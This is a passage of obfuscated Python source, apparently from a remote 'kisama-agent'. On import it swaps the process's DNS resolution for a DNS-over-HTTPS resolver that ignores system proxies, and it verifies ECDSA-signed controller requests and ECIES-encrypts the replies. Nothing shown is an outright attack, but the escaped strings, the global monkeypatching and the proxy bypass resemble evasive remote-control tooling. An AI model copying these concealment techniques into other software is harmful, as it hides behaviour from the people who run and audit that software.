    def getaddrinfo(self, host, port, O0_var_72=0, O0_var_73=0, O0_var_74=0, O0_var_75=0, orig=None):
        if orig is None:
            orig = _original_getaddrinfo
        if not isinstance(host, str) or not host or _is_ip_literal(host) or O0_var_75 & getattr(socket, codecs.decode('\\u0041\\u0049\\u005f\\u004e\\u0055\\u004d\\u0045\\u0052\\u0049\\u0043\\u0048\\u004f\\u0053\\u0054', 'unicode_escape'), 0):
            return orig(host, port, O0_var_72, O0_var_73, O0_var_74, O0_var_75)
        O0_var_76 = O0_var_72 or socket.AF_UNSPEC
        if O0_var_76 not in (socket.AF_INET, socket.AF_INET6, socket.AF_UNSPEC):
            return orig(host, port, O0_var_72, O0_var_73, O0_var_74, O0_var_75)
        O0_var_77 = self.resolve(host, O0_var_76)
        if O0_var_77 is None:
            self._warn_fallback(host)
            return orig(host, port, O0_var_72, O0_var_73, O0_var_74, O0_var_75)
        if not O0_var_77:
            raise socket.gaierror(getattr(socket, codecs.decode('\\u0045\\u0041\\u0049\\u005f\\u004e\\u004f\\u004e\\u0041\\u004d\\u0045', 'unicode_escape'), -2), codecs.decode('\\u0044\\u004e\\u0053\\u003a\\u0020\\u006e\\u006f\\u0020\\u0072\\u0065\\u0063\\u006f\\u0072\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020', 'unicode_escape') + str(host) + codecs.decode('\\u0020\\u0028\\u0073\\u0065\\u0063\\u0075\\u0072\\u0065\\u0020\\u0064\\u006e\\u0073\\u0029', 'unicode_escape'))
        O0_var_78 = []
        for O0_var_79 in O0_var_77:
            try:
                O0_var_78.extend(orig(O0_var_79, port, O0_var_72, O0_var_73, O0_var_74, O0_var_75))
            except socket.gaierror:
                continue
        if O0_var_78:
            return O0_var_78
        return orig(host, port, O0_var_72, O0_var_73, O0_var_74, O0_var_75)

    def resolve(self, host, O0_var_80):
        O0_var_81 = (host, O0_var_80)
        O0_var_82 = time.monotonic()
        with self._lock:
            O0_var_83 = self._cache.get(O0_var_81)
            if O0_var_83 is not None and O0_var_83[1] > O0_var_82:
                return list(O0_var_83[0])
        O0_var_84, O0_var_85, O0_var_86 = self._query_all(host, O0_var_80)
        with self._lock:
            if O0_var_84 == codecs.decode('\\u006f\\u006b', 'unicode_escape') and O0_var_85:
                self._cache[O0_var_81] = (list(O0_var_85), O0_var_82 + min(max(O0_var_86, self.TTL_MIN), self.TTL_MAX))
            elif O0_var_84 == codecs.decode('\\u006e\\u0078\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'):
                self._cache[O0_var_81] = ([], O0_var_82 + self.NEGATIVE_TTL)
            if O0_var_84 == codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'):
                return None
            return list(O0_var_85)

    def _query_all(self, host, O0_var_87):
        O0_var_88 = []
        if O0_var_87 in (socket.AF_INET, socket.AF_UNSPEC):
            O0_var_88.append((1, 4))
        if O0_var_87 in (socket.AF_INET6, socket.AF_UNSPEC):
            O0_var_88.append((28, 6))
        O0_var_89 = {4: [], 6: []}
        O0_var_90 = O0_var_91 = O0_var_92 = False
        O0_var_93 = self.TTL_MAX
        for O0_var_94, O0_var_95 in O0_var_88:
            O0_var_96, O0_var_97, O0_var_98 = self._query_one(host, O0_var_94)
            if O0_var_96 == codecs.decode('\\u006f\\u006b', 'unicode_escape') and O0_var_97:
                O0_var_90 = True
                O0_var_89[O0_var_95] = O0_var_97
                O0_var_93 = min(O0_var_93, O0_var_98)
            elif O0_var_96 == codecs.decode('\\u006e\\u0078\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'):
                O0_var_91 = True
            else:
                O0_var_92 = True
        if O0_var_90:
            return (codecs.decode('\\u006f\\u006b', 'unicode_escape'), self._order_addresses(O0_var_89[6], O0_var_89[4]), O0_var_93)
        if O0_var_91 and (not O0_var_92):
            return (codecs.decode('\\u006e\\u0078\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'), [], 0)
        return (codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), [], 0)

    def _query_one(self, host, O0_var_99):
        O0_var_100 = self._to_ascii(host)
        for O0_var_101, O0_var_102 in enumerate(self.servers):
            with self._lock:
                if time.monotonic() < self._fail_until[O0_var_101]:
                    continue
            try:
                O0_var_103 = self._query_fn(O0_var_102, O0_var_100, O0_var_99)
            except Exception:
                self._mark_fail(O0_var_101)
                continue
            O0_var_104 = O0_var_103.get(codecs.decode('\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), 0) if isinstance(O0_var_103, dict) else 1
            if O0_var_104 == 3:
                return (codecs.decode('\\u006e\\u0078\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'), [], 0)
            if O0_var_104 != 0:
                continue
            O0_var_105, O0_var_106 = ([], self.TTL_MAX)
            for O0_var_107 in O0_var_103.get(codecs.decode('\\u0041\\u006e\\u0073\\u0077\\u0065\\u0072', 'unicode_escape')) or []:
                if not isinstance(O0_var_107, dict) or O0_var_107.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')) != O0_var_99:
                    continue
                O0_var_108 = O0_var_107.get(codecs.decode('\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'))
                if not isinstance(O0_var_108, str) or not self._valid_literal(O0_var_108, O0_var_99):
                    continue
                O0_var_105.append(O0_var_108)
                try:
                    O0_var_106 = min(O0_var_106, int(O0_var_107.get(codecs.decode('\\u0054\\u0054\\u004c', 'unicode_escape'), self.TTL_MAX)))
                except (TypeError, ValueError):
                    pass
            if O0_var_105:
                return (codecs.decode('\\u006f\\u006b', 'unicode_escape'), list(dict.fromkeys(O0_var_105)), O0_var_106)
            return (codecs.decode('\\u006e\\u0078\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'), [], 0)
        return (codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), [], 0)

    def _mark_fail(self, O0_var_109):
        with self._lock:
            self._fail_until[O0_var_109] = time.monotonic() + self.SERVER_BACKOFF

    def _warn_fallback(self, host):
        O0_var_110 = time.monotonic()
        if O0_var_110 - self._last_fallback_warn >= self.WARN_INTERVAL:
            self._last_fallback_warn = O0_var_110
            Logger.warning(codecs.decode('\\U0001f310\\u0020\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0044\\u004e\\u0053\\u003d\\u006f\\u006e\\u003a\\u0020\\u5168\\u90e8\\u0020\\u0044\\u006f\\u0048\\u0020\\u670d\\u52a1\\u5668\\u4e0d\\u53ef\\u8fbe\\u002c\\u0020', 'unicode_escape') + repr(host) + codecs.decode('\\u0020\\u672c\\u6b21\\u56de\\u843d\\u7cfb\\u7edf\\u89e3\\u6790\\u0020\\u0028\\u53ef\\u7528\\u6027\\u4f18\\u5148\\u0029', 'unicode_escape'))

    @staticmethod
    def _order_addresses(v6, v4):
        v6, v4 = (list(dict.fromkeys(v6)), list(dict.fromkeys(v4)))
        if not v6:
            return v4
        if not v4:
            return v6
        return v6 + v4 if _ipv6_usable() else v4 + v6

    @staticmethod
    def _valid_literal(data, rtype):
        try:
            O0_var_111 = ipaddress.ip_address(data)
        except ValueError:
            return False
        return O0_var_111.version == (4 if rtype == 1 else 6)

    @staticmethod
    def _to_ascii(host):
        if host.isascii():
            return host
        try:
            return host.encode(codecs.decode('\\u0069\\u0064\\u006e\\u0061', 'unicode_escape')).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
        except (UnicodeError, UnicodeDecodeError):
            return host

    @staticmethod
    def _doh_url(server, name, rtype):
        return str(server) + codecs.decode('\\u003f\\u006e\\u0061\\u006d\\u0065\\u003d', 'unicode_escape') + str(urllib.parse.quote(name, safe='')) + codecs.decode('\\u0026\\u0074\\u0079\\u0070\\u0065\\u003d', 'unicode_escape') + str(rtype)

    def _doh_query(self, O0_var_112, name, O0_var_113):
        O0_var_114 = self._doh_url(O0_var_112, name, O0_var_113)
        O0_var_115 = urllib.request.Request(O0_var_114, headers={codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape'): codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u0064\\u006e\\u0073\\u002d\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): codecs.decode('\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002f', 'unicode_escape') + str(Config.AGENT_VERSION)})
        O0_var_116 = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        with O0_var_116.open(O0_var_115, timeout=self.QUERY_TIMEOUT) as O0_var_117:
            if getattr(O0_var_117, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), 200) != 200:
                raise OSError(codecs.decode('\\u0064\\u006f\\u0068\\u0020\\u0068\\u0074\\u0074\\u0070\\u0020\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020', 'unicode_escape') + str(O0_var_117.status))
            return json.loads(O0_var_117.read().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
_original_getaddrinfo = socket.getaddrinfo
_dns_hook = None

def O0_fn_2(O0_var_118=None):
    global _dns_hook
    if _dns_hook is not None:
        return _dns_hook
    O0_var_119 = Config.DNS_MODE if O0_var_118 is None else str(O0_var_118).strip().lower()
    if O0_var_119 != codecs.decode('\\u006f\\u006e', 'unicode_escape'):
        return None
    O0_var_120 = None
    if Config.DOH_SERVERS:
        O0_var_120 = [O0_var_121.strip() for O0_var_121 in re.split(codecs.decode('\\u005b\\u002c\\u005c\\u0073\\u005d\\u002b', 'unicode_escape'), Config.DOH_SERVERS) if O0_var_121.strip()]
    _dns_hook = SecureDns(servers=O0_var_120)
    O0_var_122 = _dns_hook

    def _patched_getaddrinfo(host, port, O0_var_123=0, O0_var_124=0, O0_var_125=0, O0_var_126=0):
        return O0_var_122.getaddrinfo(host, port, O0_var_123, O0_var_124, O0_var_125, O0_var_126, orig=_original_getaddrinfo)
    socket.getaddrinfo = _patched_getaddrinfo
    Logger.info(codecs.decode('\\U0001f310\\u0020\\u5185\\u7f6e\\u52a0\\u5bc6\\u0020\\u0044\\u004e\\u0053\\u0020\\u5df2\\u542f\\u7528\\u0020\\u0028\\u0044\\u006f\\u0048\\u0029\\u003a\\u0020', 'unicode_escape') + str(', '.join(O0_var_122.servers)))
    return _dns_hook
O0_fn_2()

def O0_fn_3(method: str, path: str, O0_var_127: str, nonce: str, O0_var_128: str) -> str:
    if not O0_var_127:
        O0_var_127 = hashlib.sha256(b'').hexdigest()
    return str(method) + codecs.decode('\\u000a', 'unicode_escape') + str(path) + codecs.decode('\\u000a', 'unicode_escape') + str(O0_var_127) + codecs.decode('\\u000a', 'unicode_escape') + str(nonce) + codecs.decode('\\u000a', 'unicode_escape') + str(O0_var_128)

class CryptoManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u52a0\\u5bc6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u4ee3\\u7406\\u7aef\\u4e13\\u7528\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u53ea\\u6301\\u6709\\u516c\\u94a5\\uff0c\\u4e0d\\u5b58\\u50a8\\u4efb\\u4f55\\u79c1\\u94a5\\u002f\\u654f\\u611f\\u4fe1\\u606f\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u63d0\\u4f9b\\u7b7e\\u540d\\u9a8c\\u8bc1\\u548c\\u54cd\\u5e94\\u52a0\\u5bc6\\u80fd\\u529b\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, O0_var_129: str, O0_var_130: str):
        self.ecdsa_vk = self._load_ecdsa_pubkey(O0_var_129)
        self.ecies_pubkey = None
        if O0_var_130 and O0_var_130.strip():
            O0_var_131 = O0_var_130.strip()
            try:
                if len(O0_var_131) > 32 and (not all((O0_var_132 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_132 in O0_var_131))):
                    self.ecies_pubkey = base64.b64decode(O0_var_131)
                else:
                    self.ecies_pubkey = bytes.fromhex(O0_var_131)
            except Exception:
                self.ecies_pubkey = O0_var_131.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_131, str) else O0_var_131
            if len(self.ecies_pubkey) not in (33, 65):
                Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u0020\\u8b66\\u544a\\u003a\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u957f\\u5ea6\\u5f02\\u5e38\\u0020\\u0028', 'unicode_escape') + str(len(self.ecies_pubkey)) + codecs.decode('\\u5b57\\u8282\\u0029\\u002c\\u0020\\u52a0\\u5bc6\\u53ef\\u80fd\\u5931\\u8d25', 'unicode_escape'))

    @staticmethod
    def _load_ecdsa_pubkey(pem_or_der: str) -> VerifyingKey:
        O0_var_133 = pem_or_der.strip()
        if codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape') in O0_var_133:
            try:
                return VerifyingKey.from_pem(O0_var_133)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0050\\u0045\\u004d\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        try:
            O0_var_134 = codecs.decode('', 'unicode_escape').join(O0_var_133.split())
            O0_var_135 = base64.b64decode(O0_var_134, validate=True)
        except (binascii.Error, ValueError):
            O0_var_135 = O0_var_133.encode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u0031', 'unicode_escape'))
        try:
            return VerifyingKey.from_der(O0_var_135)
        except Exception:
            pass
        if len(O0_var_135) in (33, 65) and O0_var_135[0] in (2, 3, 4):
            try:
                return VerifyingKey.from_string(O0_var_135, curve=TEMP_ECDSA_CURVE)
            except Exception as e:
                raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0072\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u002f\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        raise ValueError(codecs.decode('\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u006c\\u006f\\u0061\\u0064\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u002e\\u0020\\u0050\\u006c\\u0065\\u0061\\u0073\\u0065\\u0020\\u0063\\u0068\\u0065\\u0063\\u006b\\u003a\\u000a\\u0031\\u002e\\u0020\\u0050\\u0045\\u004d\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0020\\u0028\\u0073\\u0074\\u0061\\u0072\\u0074\\u0073\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0027\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u0027\\u0029\\u000a\\u0032\\u002e\\u0020\\u0053\\u0074\\u0061\\u006e\\u0064\\u0061\\u0072\\u0064\\u0020\\u0058\\u002e\\u0035\\u0030\\u0039\\u0020\\u0044\\u0045\\u0052\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0033\\u002e\\u0020\\u0052\\u0061\\u0077\\u0020\\u0053\\u0045\\u0043\\u0031\\u0020\\u0043\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0033\\u0033\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u006f\\u0072\\u0020\\u0055\\u006e\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0028\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u0029\\u0020\\u0069\\u006e\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u000a\\u0050\\u0072\\u006f\\u0076\\u0069\\u0064\\u0065\\u0064\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020\\u0028\\u0064\\u0065\\u0063\\u006f\\u0064\\u0065\\u0064\\u0029\\u003a\\u0020', 'unicode_escape') + str(len(O0_var_135)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u002e', 'unicode_escape'))

    @staticmethod
    def validate_ecies_pubkey(pubkey_b64: str) -> bytes:
        if not pubkey_b64 or not pubkey_b64.strip():
            raise ValueError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0069\\u0073\\u0020\\u0065\\u006d\\u0070\\u0074\\u0079', 'unicode_escape'))
        O0_var_136 = pubkey_b64.strip()
        try:
            if len(O0_var_136) > 32 and (not all((O0_var_137 in codecs.decode('\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046', 'unicode_escape') for O0_var_137 in O0_var_136))):
                O0_var_138 = codecs.decode('', 'unicode_escape').join(O0_var_136.split())
                O0_var_139 = base64.b64decode(O0_var_138, validate=True)
            else:
                O0_var_139 = bytes.fromhex(O0_var_136)
        except Exception as e:
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u003a\\u0020', 'unicode_escape') + str(e))
        if len(O0_var_139) not in (33, 65):
            raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0020', 'unicode_escape') + str(len(O0_var_139)) + codecs.decode('\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073\\u003b\\u0020\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0033\\u0033\\u0020\\u006f\\u0072\\u0020\\u0036\\u0035\\u0020\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape'))
        return O0_var_139

    def verify_signature(self, method: str, path: str, O0_var_140: str, nonce: str, O0_var_141: str, O0_var_142: str) -> bool:
        try:
            O0_var_143 = int(O0_var_141)
            O0_var_144 = int(time.time())
            if abs(O0_var_144 - O0_var_143) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_144 - O0_var_143)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_145 = O0_fn_3(method, path, O0_var_140, nonce, O0_var_141).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_146 = hashlib.sha256(O0_var_145)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + repr(O0_var_145))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_146.hexdigest()))
        try:
            O0_var_147 = base64.b64decode(O0_var_142)
            O0_var_148 = len(O0_var_147)
            if O0_var_148 == 64:
                O0_var_149 = sigdecode_string
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            elif O0_var_148 > 64 and O0_var_147[0] == 48:
                O0_var_149 = sigdecode_der
                Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u4fa6\\u6d4b\\u5230\\u0020\\u0044\\u0045\\u0052\\u0020\\u683c\\u5f0f\\u7b7e\\u540d', 'unicode_escape'))
            else:
                O0_var_149 = sigdecode_der
            self.ecdsa_vk.verify(O0_var_147, O0_var_145, hashfunc=hashlib.sha256, sigdecode=O0_var_149)
        except BadSignatureError:
            Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u574f\\u7b7e\\u540d', 'unicode_escape'))
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))
        except Exception as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        return True

    def identify_signer(self, method: str, path: str, O0_var_150: str, nonce: str, O0_var_151: str, O0_var_152: str, O0_var_153: Optional[VerifyingKey]=None) -> str:
        try:
            O0_var_154 = int(O0_var_151)
            O0_var_155 = int(time.time())
            if abs(O0_var_155 - O0_var_154) > Config.TIMESTAMP_WINDOW:
                raise ValueError(codecs.decode('\\u0054\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u0020\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0064\\u003a\\u0020\\u0064\\u0069\\u0066\\u0066\\u003d', 'unicode_escape') + str(abs(O0_var_155 - O0_var_154)) + codecs.decode('\\u0073\\u0020\\u003e\\u0020', 'unicode_escape') + str(Config.TIMESTAMP_WINDOW) + codecs.decode('\\u0073', 'unicode_escape'))
        except ValueError as e:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070\\u003a\\u0020', 'unicode_escape') + str(str(e)))
        O0_var_156 = O0_fn_3(method, path, O0_var_150, nonce, O0_var_151).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_157 = hashlib.sha256(O0_var_156)
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020', 'unicode_escape') + repr(O0_var_156))
        Logger.debug(codecs.decode('\\u005b\\u0042\\u0061\\u0063\\u006b\\u0065\\u006e\\u0064\\u005d\\u0020\\u0053\\u0048\\u0041\\u0032\\u0035\\u0036\\u003a\\u0020', 'unicode_escape') + str(O0_var_157.hexdigest()))
        if self._verify_with(self.ecdsa_vk, O0_var_152, O0_var_156):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u0020\\u0028\\u63a7\\u5236\\u7aef\\u9759\\u6001\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')
        if O0_var_153 is not None and self._verify_with(O0_var_153, O0_var_152, O0_var_156):
            Logger.debug(codecs.decode('\\u005b\\u0041\\u0075\\u0074\\u0068\\u005d\\u0020\\u7b7e\\u540d\\u6765\\u6e90\\u003a\\u0020\\u0074\\u0065\\u006d\\u0070\\u0020\\u0028\\u4e34\\u65f6\\u5bc6\\u94a5\\u0029', 'unicode_escape'))
            return codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape')
        Logger.info(codecs.decode('\\u274c\\u0020\\u7b7e\\u540d\\u9a8c\\u8bc1\\u5931\\u8d25\\u003a\\u0020\\u9759\\u6001\\u5bc6\\u94a5\\u4e0e\\u4e34\\u65f6\\u5bc6\\u94a5\\u5747\\u4e0d\\u5339\\u914d', 'unicode_escape'))
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))

    @staticmethod
    def _verify_with(vk: VerifyingKey, auth_token: str, message: bytes) -> bool:
        try:
            O0_var_158 = base64.b64decode(auth_token)
            O0_var_159 = len(O0_var_158)
            if O0_var_159 == 64:
                O0_var_160 = sigdecode_string
            elif O0_var_159 > 64 and O0_var_158[0] == 48:
                O0_var_160 = sigdecode_der
            else:
                O0_var_160 = sigdecode_der
            vk.verify(O0_var_158, message, hashfunc=hashlib.sha256, sigdecode=O0_var_160)
            return True
        except BadSignatureError:
            return False
        except Exception:
            return False

    def encrypt_response(self, data: Dict[str, Any], O0_var_161: Optional[bytes]=None) -> str:
        O0_var_162 = O0_var_161 or self.ecies_pubkey
        if Config.DEBUG:
            return json.dumps(data, ensure_ascii=False, default=str)
        if not O0_var_162:
            raise RuntimeError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u006e\\u006f\\u0074\\u0020\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u002c\\u0020\\u0063\\u0061\\u006e\\u006e\\u006f\\u0074\\u0020\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065', 'unicode_escape'))
        try:
            O0_var_163 = json.dumps(data, ensure_ascii=False, default=str).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
            O0_var_164 = ecies_encrypt(O0_var_162, O0_var_163)
            return base64.b64encode(O0_var_164).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
        except Exception as e:
            raise RuntimeError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0020\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e)) from e

    def decrypt_data(O0_var_165: str, key: bytes):
        try:
